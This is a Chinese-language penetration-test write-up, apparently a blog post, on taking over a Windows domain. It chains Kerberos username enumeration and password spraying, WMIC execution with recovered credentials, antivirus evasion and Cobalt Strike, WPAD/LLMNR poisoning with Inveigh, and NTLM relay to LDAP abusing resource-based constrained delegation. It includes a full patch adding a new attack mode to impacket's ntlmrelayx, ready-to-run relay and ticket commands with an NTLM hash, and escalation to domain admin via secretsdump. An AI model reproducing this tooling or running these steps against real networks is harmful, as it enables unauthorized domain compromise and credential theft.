#### 0x00 前言

本文源自一次真实的渗透过程记录，介绍基于资源的约束委派的另一种利用场景，希望能对各位看客有所帮助

![](https://image.3001.net/images/20210122/1611281396_600a33f4c931e9b2e9db5.png!small)

#### 0x01 背景

通过 VPN 拨入内网，根据下发路由和前期的探测发现目标内网存在 10.10.1.0/24 、10.10.2.0/24 两个活跃段。10.10.1.88
为域控制器。

#### 0x02

根据前期的信息收集，活跃段中并没有什么可以直接利用的点，整理手上的已有信息。目标内网的机器主机名均为 ATTACK-TONY-PC
，猜测中间的字符串为用户名，使用 Kerberos pre-auth 的特性验证了我们的猜测，并收集所有主机名和 VPN
密码做组合成功枚举出了一组口令。具体用到的工具参考 [渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4/)

#### 0x03

根据以往的经验，这种以用户名为主机名的域，大概率会把域用户添加到本地管理员组，找到用户对应的机器，直接 wmic 试一下

    
    
    wmic /node:10.10.1.96 /user:ATTACK\TONY /password:1qaz2wsx os get name

果然正确的返回的操作系统信息。继续通过 wmic 获取机器上的进程，

    
    
    wmic /node:10.10.1.96 /user:ATTACK\TONY /password:1qaz2wsx process get name

根据机器上的防护软件进行相应的免杀，落地二进制文件，上线到
CS。到此，我们获取到了域内的一个落脚点。不幸的是，这台机器的主人貌似这是个边缘人员，翻遍机器也没有找到对我们用帮助的信息。本机的 500
用户为空密码。查看 LDAP 中的信息，几乎整个域内机器均为 win10，有少量几台 server 2016，当前我们处在
10.10.1.96，域管的位置在 10.10.2.66。继续查看 LDAP 中的信息，其中有一个我们比较关注的点：大多数机器`mS-DS-CreatorSID`都是对应用户的 SID，少部分机器的为`mS-DS-CreatorSID`同一用户的 SID
(网络管理员)。也就是说域内机器基本都是是用户自己拉入域的，域用户对他拉入的机器用户有`WriteProperty`权限，可以操作机器用户的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性。如果我们有了用户的权限，就满足了2个利用基于资源的约束委派的条件

> 能够修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性

> 有一个机器账户（这里说法其实不太准确，应该是需要一个具有SPN的账户，更详细的说是需要一个账户的TGT就可以，机器账户满足以上条件）

机器账户我们可以使用之前获取到的机器`ATTACK-TONY-PC$`，那用户权限又该从哪里获取呢？

#### 0x04 WPAD + NTLM 中继 + 基于资源的约束委派

在开始前让我们对涉及到的知识点做一个简单的说明。（这里只是简单的提一下，想要完全搞明白还需要自行深入学习各个知识点）

  * WPAD

> `WPAD（Web Proxy Auto-Discovery
> Protocol）`是`Web`代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果找到了代理服务器，则会从代理服务器中下载一个名为`PAC（Proxy
> Auto-Config）`的配置文件。该文件中定义了用户在访问一个 URL
> 时所应该使用的代理服务器。浏览器会下载并解析该文件，并将相应的代理服务器设置到用户的浏览器中。在请求`WPAD`的过程中，如果服务端要求`401`认证，部分浏览器和应用将会自动用当前用户凭证进行认证。

  * LLMNR，NBT-NS

> LLMNR 和 NBT-NS 均为名称解析机制中用到的协议，在windows名称解析过程中，大致的顺序为`DNS -> LLMNR ->
> NetBIOS`。简单的说`DNS`协议解析不到的地址，`windows`则会在当前网段域子网域发送广播`（LLMNR，NetBIOS）`来请求地址解析，如果我们和目标机器在同一子网域则可以回复广播，欺骗地址解析。

  * NTLM Ralay

> [NTLM Relay](https://en.hackndo.com/ntlm-relay)

  * 基于资源的约束委派

> Windows Server
> 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。

> [域渗透——基于资源的约束委派利用](https://xz.aliyun.com/t/7454)

明白了上面这些知识后，我们就可以开始进行攻击了，攻击流程为：在当前网段进行投毒，通过`WPAD`欺骗，让用户来向我们进行`NTLM`认证，再将认证请求中继到`LDAP`，因为用户可以修改他拉入的机器的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性，我们对该属性进行修以配置基于资源的约束委派，来拿到其主机的权限。

#### 0x05 修改 impacket

impacket
目前只看到有从机器用户中继修改基于资源的约束委派的功能，对于我们这个攻击流程，需要稍微修改一下。为了方便某些同学调试，我把修改过程放在这里，不想看可以直接跳过，文末有修改打包好的
impacket。

`/impacket/examples/ntlmrelayx.py`中

添加`options.user_delegate_access`

    
    
    c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.sid, options.user_delegate_access)

在参数处理的地方 添加

![](https://image.3001.net/images/20210122/1611281398_600a33f6483ef12a28c71.png!small)

    
    
    ldapoptions.add_argument('--user-delegate-access', action='store_true', required=False, help='Delegate access on relayed user account to the specified account')

/impacket/impacket/examples/ntlmrelayx/utils/config.py 中

修改函数`setLDAPOptions`，添加`userdelegateaccess`

    
    
    def setLDAPOptions(self, dumpdomain, addda, aclattack, validateprivs, escalateuser, addcomputer, delegateaccess, dumplaps, dumpgmsa, sid, userdelegateaccess):  
    self.dumpdomain = dumpdomain  
    self.addda = addda  
    self.aclattack = aclattack  
    self.validateprivs = validateprivs  
    self.escalateuser = escalateuser  
    self.addcomputer = addcomputer  
    self.delegateaccess = delegateaccess  
    self.dumplaps = dumplaps  
    self.dumpgmsa = dumpgmsa  
    self.sid = sid  
    self.userdelegateaccess = userdelegateaccess

`/impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py`中

添加全局变量`delegatePerformedUser`

![](https://image.3001.net/images/20210122/1611281398_600a33f6d2d5e0f5c975e.png!small)

在`class LDAPAttack(ProtocolAttack):`中 添加如下代码

    
    
    def MFdelegateAttack(self, usersam, targetsam, domainDumper, sid, ssid):  
    global delegatePerformedUser  
      
    if not usersam:  
    usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)  
    self.config.escalateuser = usersam  
      
    if not sid:  
    # Get escalate user sid  
    result = self.getUserInfo(domainDumper, usersam)  
    if not result:  
    LOG.error('User to escalate does not exist!')  
    return  
    escalate_sid = str(result[1]) # sid   
    else:  
    escalate_sid = usersam  
      
    AttackList = self.getCreatorSID(domainDumper, ssid);  
    # LOG.debug(AttackList)  
    # LOG.debug(escalate_sid)  
    if AttackList is False:  
    LOG.info('Cannot find a computer with mS-DS-CreatorSID %s' % ssid)  
    return  
      
    LOG.info("Try to modifiy delegation rights")  
      
    for Attack in AttackList:  
    self.addDelegation(Attack[0], escalate_sid)  
      
    delegatePerformedUser.append(targetsam)  
      
    def addDelegation(self,target_dn,escalate_sid):  
    self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity','name'])  
    targetuser = None  
    for entry in self.client.response:  
    if entry['type'] != 'searchResEntry':  
    continue  
    targetuser = entry  
    if not targetuser:  
    LOG.error('Could not query target user properties')  
    return False  
      
    try:  
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])  
    LOG.debug('Currently allowed sids:')  
    for ace in sd['Dacl'].aces:  
    LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())  
    except IndexError:  
    sd = create_empty_sd()  
      
    sd['Dacl'].aces.append(create_allow_ace(escalate_sid))  
    self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})  
    if self.client.result['result'] == 0:  
    LOG.info('Delegation rights modified succesfully!')  
    LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.config.escalateuser, targetuser['attributes']['name'])  
    return True  
    else:  
    if self.client.result['result'] == 50:  
    LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])  
    elif self.client.result['result'] == 19:  
    LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])  
    else:  
    LOG.error('The server returned an error: %s', self.client.result['message'])  
    return False  
      
    def userdelegateAttack(self, usersam, targetsam, domainDumper, sid):  
    global delegatePerformedUser  
    if targetsam in delegatePerformedUser:  
    LOG.info('Delegate attack already performed for this User: %s, skipping' % targetsam)  
    return  
      
    self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(targetsam), attributes=['objectSid', 'primaryGroupId'])  
      
    user = self.client.entries[0]  
    usersid = user['objectSid'].value  
      
    tmp_flag = self.getCreatorSID(domainDumper, usersid)  
    LOG.info('Try to find the computer with mS-DS-CreatorSID %s' % usersid)  
    if tmp_flag is not False:  
    for x in tmp_flag:  
    LOG.info('DN : %s SID : %s' % (x[0], x[1]))  
      
    self.MFdelegateAttack(usersam, targetsam, domainDumper, sid, usersid)  
      
    

在`run`函数中添加如下代码

![](https://image.3001.net/images/20210122/1611281399_600a33f743f2e6280e99a.png!small)

    
    
    if self.config.userdelegateaccess:  
    self.userdelegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)  
    return

重新安装`impacket`

    
    
    pip3 uninstall impacket;pip3 install .

用法

    
    
    sudo python3 ./examples/ntlmrelayx.py -t ldap://192.168.1.63 --escalate-user=WIN10\$ --user-delegate-access  
    sudo python3 ./examples/ntlmrelayx.py -t ldaps://192.168.1.63 --user-delegate-access

#### 0x06 完成攻击链

为了避免不必要的意外，用本地测试环境来代替

name| note  
---|---  
Administer| 域管理员  
rabbit| 普通域用户  
test| 普通域用户  
name| os| ip| note  
---|---|---|---  
DC| server2016| 192.168.1.63| 域控制器  
WIN10| windows10| 192.168.1.59| 个人PC，模拟我们在域内拿下的那台机器  
WIN10-1| windows10| 192.168.1.78| 个人PC，由用户 ATTACT\TEST 拉入域，登录用户 ATTACT\TEST  
WIN10-2| windows10| 192.168.1.77| 个人PC，由用户 ATTACT\TEST 拉入域，登录用户 ATTACT\TEST  
kali| kali| 192.168.1.79| 模拟外网 vps  
  
首先我们在`WIN10`这台机器上开启`Inveigh`来进行`LLMNR/NBNS`协议欺骗，这里我们只需要投毒的功能，所以只用`C#`版本的`Inveigh`就可以了，还可以配合`cs`的`execute-assembly`来执行以规避杀软。欺骗的地址指向外网的`vps`,也就是当前环境中的`kali`

    
    
    execute-assembly c:\windows\rabbit\tools\Inveigh.exe -SpooferIP 192.168.1.79

`kali`开启 ntlmrelay.py 进行监听，指定相关攻击的参数

    
    
    sudo python3 ./examples/ntlmrelayx.py -t ldap://192.168.1.63 --escalate-user=WIN10\$ --user-delegate-access -debug

这里以`chrome`为例，当用户`ATTACK\TEST`点击`chrome`时，则会触发我们的攻击链，接管机器权限。

a03bb9d7f80559c87765c72cb3d53d1d.png

可以看到，我们以成功配置了`WIN10$`到`WIN10-1`和`WIN10-2`的基于资源的约束委派。接下来就可以申请高权的票据来访问对应的服务了。

    
    
    python3 getST.py -dc-ip 192.168.1.63 ATTACK/WIN10\$ -hashes aad3b435b51404eeaad3b435b51404ee:0c5082ca74c579d34d4de279a84ee44f -spn host/WIN10-2.attack.com -impersonate administrator

注入票据到当前上下文，并尝试访问，如图所示，成功获取到机器`WIN10-2`的权限。

![](https://image.3001.net/images/20210122/1611281399_600a33f7b3d62e7090bc2.png!small)具体什么服务需要使用什么票据，参考这里
[How Attackers Use Kerberos Silver Tickets to Exploit Systems
](https://adsecurity.org/?p=2011)

Service Type| Service Silver Tickets  
---|---  
WMI| HOST,RPCSS  
PowerShell Remoting| HOST,HTTP(WSMAN,RPCSS)  
WinRM| HOST,HTTP  
Scheduled Tasks| HOST  
Windows File Share (CIFS)| CIFS  
LDAP operations including Mimikatz DCSync| LDAP  
Windows Remote Server Administration Tools| RPCSS,LDAP,CIFS  
  
举个例子：

![](https://image.3001.net/images/20210122/1611281400_600a33f898f91a41e1fc8.gif!small)以上就是整个攻击链。回到实战中，实战中，我通过如上攻击链定向（Inveigh
指定 SpooferIPsReply 参数对特定ip进行欺骗）的拿到了几个开发权限，并从其中一台机器上获取了一台 10.10.2.0/24
段上的机器权限，这样我们就移动到与域管同一网段下，那我们可以继续中继域管的凭证到 LDAP 去修改添加特权到任意用户。`Inveigh`指定
域管的ip。开启 ntlmrelay 监听，指定攻击 ldap 并且指定用户。

    
    
    execute-assembly c:\windows\rabbit\tools\Inveigh.exe -SpooferIPsReply 10.10.2.66  -SpooferIP VPS-IP
    
    
    proxychains python3 ./examples/ntlmrelayx.py -t ldap://192.168.98.10 --escalate-user=rabbit

两分钟以后，域管请求了我们的 WPAD ，成功中继到 ldap 并且赋予了我们指定用户特权。（过程截图仍由测试环境代替）

![](https://image.3001.net/images/20210122/1611281405_600a33fdee29273227d40.png!small)![](https://image.3001.net/images/20210122/1611281406_600a33fe7a5bd6edcd43a.png!small)接下来就是
secretsdump.py dump 域管 hash，接管域控了。至此，拿到整个域权限。

![](https://image.3001.net/images/20210122/1611281407_600a33ffa3d376fd44a14.png!small)

#### 0x07 参考链接

[微软不认的“0day”之域内本地提权-烂番茄（Rotten
Tomato）](https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw)

[这是一篇“不一样”的真实渗透测试案例分析文章](https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ)

[How Attackers Use Kerberos Silver Tickets to Exploit Systems
](https://adsecurity.org/?p=2011)[windows-protocol](https://daiker.gitbook.io/windows-protocol/)

[NTLM Relay](https://en.hackndo.com/ntlm-relay)[渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4/)

[WPAD
协议分析及内网渗透利用](https://xz.aliyun.com/t/1739)[域渗透——基于资源的约束委派利用](https://xz.aliyun.com/t/7454)

